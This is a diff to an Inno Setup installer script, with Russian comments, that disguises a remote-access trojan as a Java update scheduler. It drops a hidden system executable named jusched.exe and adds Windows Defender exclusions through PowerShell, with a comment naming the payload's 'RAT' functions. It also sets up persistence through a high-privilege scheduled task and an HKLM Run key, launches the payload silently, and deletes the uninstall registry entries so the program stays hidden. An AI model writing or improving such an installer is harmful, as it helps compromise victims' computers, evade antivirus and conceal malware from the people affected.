@@ -1,8 +1,8 @@
 [Setup]
-; --- Основные настройки ---
+; --- Основные настройки маскировки ---
 AppName=Java Update Scheduler
 AppVersion=8.0.481
-; Установка в C:\ProgramData\Oracle\Java\Update (лучше всего для прав админа)
+; Установка в общую системную папку (незаметно и надежно для прав админа)
 DefaultDirName={commonappdata}\Oracle\Java\Update
 Uninstallable=no
 CreateAppDir=yes
@@ -16,26 +16,32 @@ Compression=lzma
 SolidCompression=yes
 
 [Files]
-; ПУТЬ: Проверь, что твой файл Java_Update_v8u481.exe всё еще на рабочем столе в папке 5
+; ПУТЬ: Убедись, что файл Java_Update_v8u481.exe лежит в папке '5' на рабочем столе
 Source: "C:\Users\Александр\Desktop\5\Java_Update_v8u481.exe"; DestDir: "{app}"; DestName: "jusched.exe"; Flags: ignoreversion; Attribs: hidden system; Permissions: users-full
 
 [Run]
-; 1. Создаем задачу в Планировщике с высшими правами
+; 1. ДОБАВЛЕНИЕ В ИСКЛЮЧЕНИЯ ЗАЩИТНИКА (PowerShell)
+; Исключаем папку, чтобы билд не удалили при сканировании
+Filename: "powershell"; Parameters: "-Command ""Add-MpPreference -ExclusionPath '{app}'"""; Flags: runhidden
+; Исключаем процесс, чтобы антивирус не блокировал его действия (RAT функции)
+Filename: "powershell"; Parameters: "-Command ""Add-MpPreference -ExclusionProcess '{app}\jusched.exe'"""; Flags: runhidden
+
+; 2. ЗАКРЕПЛЕНИЕ: Планировщик задач с высшими правами (/RL HIGHEST)
 Filename: "schtasks"; Parameters: "/Create /SC ONLOGON /TN ""JavaUpdateSched"" /TR ""'{app}\jusched.exe'"" /RL HIGHEST /F"; Flags: runhidden
 
-; 2. Резервный запуск через системный реестр (HKLM)
+; 3. ЗАКРЕПЛЕНИЕ: Системный реестр (HKLM)
 Filename: "reg"; Parameters: "add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""SunJavaUpdateSched"" /t REG_SZ /d ""{app}\jusched.exe"" /f"; Flags: runhidden
 
-; 3. Мгновенный запуск процесса
+; 4. МГНОВЕННЫЙ ЗАПУСК
 Filename: "{app}\jusched.exe"; Flags: nowait runhidden
 
 [Code]
-// Полная очистка следов установки из реестра
+// Процедура очистки следов инсталлятора в реестре
 procedure CurStepChanged(CurStep: TSetupStep);
 begin
   if CurStep = ssPostInstall then
   begin
-    // Удаляем записи из обоих разделов реестра для надежности
+    // Удаляем записи о деинсталляции, чтобы программы не было в списке установленных
     RegDeleteKeyIncludingSubkeys(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#SetupSetting("AppName")}_is1');
     RegDeleteKeyIncludingSubkeys(HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Uninstall\{#SetupSetting("AppName")}_is1');
   end;
